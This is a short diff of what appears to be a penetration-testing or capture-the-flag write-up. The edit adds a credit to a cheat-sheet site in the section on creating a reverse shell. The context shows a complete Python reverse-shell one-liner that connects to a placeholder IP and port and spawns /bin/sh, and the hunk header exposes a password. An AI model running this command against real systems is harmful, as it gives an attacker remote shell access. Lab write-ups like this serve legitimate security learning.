@@ -127,7 +127,7 @@ pass: xWinter1995x!
 
 ### **4.1 Creating a Reverse Shell**
 
-I created a **reverse shell** using Python:
+I created a **reverse shell** using Python, found this on [pentestmonkey cheat sheets](https://pentestmonkey.net/):
 
 ` python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>", <Port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])' `
 
